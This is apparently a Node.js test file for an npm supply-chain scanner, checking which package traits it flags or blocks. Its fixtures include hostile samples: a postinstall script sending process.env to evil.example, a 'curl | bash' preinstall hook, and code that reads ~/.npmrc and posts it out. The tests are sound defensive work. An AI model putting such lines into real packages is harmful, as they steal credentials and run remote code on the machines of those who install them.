import test from "node:test";
import assert from "node:assert/strict";
import { analyzePackage, addAiUnavailableFinding } from "../src/analysis.js";
import { decideVerdict } from "../src/verdict.js";

function establishedSnapshot(manifest) {
  return {
    ...fakeSnapshot(manifest),
    packageCreatedAt: "2017-03-04T00:00:00.000Z",
    versionPublishedAt: "2024-02-02T00:00:00.000Z",
    downloads: { downloads: 4_000_000 },
  };
}

function fakeSnapshot(manifest) {
  return {
    spec: { name: "sketchy", wanted: "latest" },
    manifest,
    packageCreatedAt: new Date().toISOString(),
    versionPublishedAt: new Date().toISOString(),
    downloads: { downloads: 7 },
  };
}

test("analysis detects install-time environment exfiltration", () => {
  const manifest = {
    name: "sketchy",
    version: "1.0.0",
    scripts: { postinstall: "node postinstall.js" },
    bin: "cli.js",
  };
  const inspection = {
    findings: [],
    fileCount: 3,
    totalUnpackedBytes: 1000,
    packageJson: manifest,
    selectedFiles: [
      {
        path: "postinstall.js",
        text: "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process.env) })",
        size: 96,
        truncated: false,
        reasons: ["postinstall script target"],
      },
    ],
  };

  const analysis = analyzePackage(fakeSnapshot(manifest), inspection);
  assert.equal(analysis.needsAi, true);
  const exfiltration = analysis.findings.find((finding) => finding.code === "possible_secret_exfiltration");
  assert.ok(exfiltration);
  assert.equal(exfiltration.evidence[0].line, 1);
  assert.match(exfiltration.evidence[0].excerpt, /process\.env/);
  assert.ok(analysis.findings.some((finding) => finding.code === "lifecycle_hook"));

  const verdict = decideVerdict(analysis, { status: "skipped" });
  assert.equal(verdict.verdict, "block");
});

test("missing AI review for lifecycle hooks becomes caution", () => {
  const manifest = {
    name: "cautious",
    version: "1.0.0",
    scripts: { postinstall: "node install.js" },
    bin: "cli.js",
  };
  const inspection = {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 500,
    packageJson: manifest,
    selectedFiles: [{ path: "install.js", text: "console.log('install')", size: 22, truncated: false, reasons: [] }],
  };

  const analysis = analyzePackage(fakeSnapshot(manifest), inspection);
  const withAiUnavailable = addAiUnavailableFinding(analysis, "not configured");
  const verdict = decideVerdict(withAiUnavailable, { status: "unavailable", reason: "not configured" });
  assert.equal(verdict.verdict, "caution");
  assert.ok(withAiUnavailable.findings.some((finding) => finding.code === "ai_unavailable"));
});

test("analysis reports established registry context without overriding findings", () => {
  const manifest = { name: "established", version: "2.0.0", scripts: {}, bin: "cli.js" };
  const snapshot = {
    ...fakeSnapshot(manifest),
    packageCreatedAt: "2018-01-01T00:00:00.000Z",
    versionPublishedAt: "2025-01-01T00:00:00.000Z",
    downloads: { downloads: 250_000 },
    profile: { maintainersCount: 3, repository: { github: "owner/repo" } },
  };
  const analysis = analyzePackage(snapshot, {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 500,
    packageJson: manifest,
    selectedFiles: [],
  });

  assert.equal(analysis.stats.trustContext.level, "established-signals");
  assert.ok(analysis.stats.trustContext.signals.includes("high weekly adoption"));
  assert.equal(analysis.findings.length, 0);
});


test("analysis does not combine distant unrelated entrypoint signals", () => {
  const manifest = { name: "noisy-bin", version: "1.0.0", scripts: {}, bin: "bin.js" };
  const distantText = `console.log("docs: https://example.com/help");
${"x".repeat(1200)}
require("child_process").execFileSync("node", ["worker.js"]);`;
  const analysis = analyzePackage(fakeSnapshot(manifest), {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 2_000,
    packageJson: manifest,
    selectedFiles: [{
      path: "bin.js",
      text: distantText,
      size: distantText.length,
      truncated: false,
      reasons: ["bin entrypoint"],
    }],
  });

  assert.equal(analysis.findings.some((finding) => finding.code === "network_and_shell"), false);
});

test("bundled code with distant env access and network calls is not exfiltration", () => {
  const manifest = { name: "bundled", version: "1.0.0", scripts: {}, bin: "dist/cli.js" };
  // The shape that made vite, rollup, and npm-check-updates hard-Block: the debug
  // package's option parsing and an unrelated URL parser in one bundled chunk.
  const bundled = [
    'const opts = Object.keys(process.env).filter((key) => /^debug_/i.test(key));',
    "const pad = 1;\n".repeat(300),
    'const parsed = fetch("http://example.com/" + input);',
  ].join("\n");
  const analysis = analyzePackage(fakeSnapshot(manifest), {
    findings: [],
    fileCount: 4,
    totalUnpackedBytes: 9_000,
    packageJson: manifest,
    selectedFiles: [{
      path: "dist/cli.js",
      text: bundled,
      size: bundled.length,
      truncated: false,
      reasons: ["bin entrypoint"],
    }],
  });

  assert.equal(analysis.findings.some((finding) => finding.code === "possible_secret_exfiltration"), false);
  assert.ok(analysis.findings.some((finding) => finding.code === "env_access_and_network"));
  assert.equal(decideVerdict(analysis, { status: "skipped" }).verdict, "proceed");
});

test("bitwise and charset idioms are not environment enumeration", () => {
  const manifest = { name: "minified", version: "1.0.0", scripts: {}, bin: "index.js" };
  const minified = 'const m=offset|0,c="charset>";fetch("https://cdn.example.com/x");';
  const analysis = analyzePackage(fakeSnapshot(manifest), {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 400,
    packageJson: manifest,
    selectedFiles: [{
      path: "index.js",
      text: minified,
      size: minified.length,
      truncated: false,
      reasons: ["bin entrypoint"],
    }],
  });

  assert.equal(analysis.findings.some((finding) => finding.severity === "critical"), false);
  assert.equal(decideVerdict(analysis, { status: "skipped" }).verdict, "proceed");
});

test("publish-time hooks are context, not install-time risk", () => {
  const manifest = {
    name: "builds-on-publish",
    version: "1.0.0",
    scripts: { prepare: "husky && node ./scripts/build.js", prepublish: "tshy" },
    bin: "cli.js",
  };
  const analysis = analyzePackage(establishedSnapshot(manifest), {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 500,
    packageJson: manifest,
    selectedFiles: [],
  });

  assert.equal(analysis.findings.some((finding) => finding.code === "lifecycle_hook"), false);
  assert.equal(analysis.findings.filter((finding) => finding.code === "publish_lifecycle_hook").length, 2);
  assert.equal(analysis.stats.lifecycleScripts.length, 0);
  assert.equal(analysis.stats.publishScripts.length, 2);
  // Publish hooks alone must not spend an AI call or reach Caution.
  assert.equal(analysis.needsAi, false);
  assert.equal(decideVerdict(analysis, { status: "skipped" }).verdict, "proceed");
});

test("a dependency's own devDependencies are out of the consumer trust boundary", () => {
  const manifest = {
    name: "self-referencing",
    version: "1.0.0",
    bin: "cli.js",
    dependencies: { safe: "^1.0.0" },
    devDependencies: { itself: "file:.." },
    peerDependencies: { host: "git+https://github.com/o/r.git" },
  };
  const analysis = analyzePackage(fakeSnapshot(manifest), {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 500,
    packageJson: manifest,
    selectedFiles: [],
  });

  assert.equal(analysis.findings.some((finding) => finding.code === "unusual_dependency_protocol"), false);
});

test("an installed dependency on a non-registry protocol is still flagged", () => {
  const manifest = {
    name: "sideloads",
    version: "1.0.0",
    bin: "cli.js",
    dependencies: { payload: "https://example.com/payload.tgz" },
  };
  const analysis = analyzePackage(fakeSnapshot(manifest), {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 500,
    packageJson: manifest,
    selectedFiles: [],
  });

  assert.ok(analysis.findings.some((finding) => finding.code === "unusual_dependency_protocol"));
});

test("install-time download-and-execute is still critical", () => {
  const manifest = {
    name: "dropper",
    version: "1.0.0",
    scripts: { preinstall: "curl -s https://evil.example/p.sh | bash" },
    bin: "cli.js",
  };
  const analysis = analyzePackage(fakeSnapshot(manifest), {
    findings: [],
    fileCount: 1,
    totalUnpackedBytes: 200,
    packageJson: manifest,
    selectedFiles: [],
  });

  assert.ok(analysis.findings.some((finding) => finding.code === "download_and_execute"));
  assert.equal(decideVerdict(analysis, { status: "skipped" }).verdict, "block");
});

test("credential theft in an install script target is still critical", () => {
  const manifest = {
    name: "npmrc-thief",
    version: "1.0.0",
    scripts: { postinstall: "node setup.js" },
    bin: "cli.js",
  };
  const stealer = [
    'const rc = require("fs").readFileSync(require("os").homedir() + "/.npmrc", "utf8");',
    'require("https").request({ host: "evil.example", method: "POST" }).end(rc);',
  ].join("\n");
  const analysis = analyzePackage(fakeSnapshot(manifest), {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 600,
    packageJson: manifest,
    selectedFiles: [{
      path: "setup.js",
      text: stealer,
      size: stealer.length,
      truncated: false,
      reasons: ["postinstall script target"],
    }],
  });

  assert.ok(analysis.findings.some((finding) => finding.code === "possible_secret_exfiltration"));
  assert.equal(decideVerdict(analysis, { status: "skipped" }).verdict, "block");
});
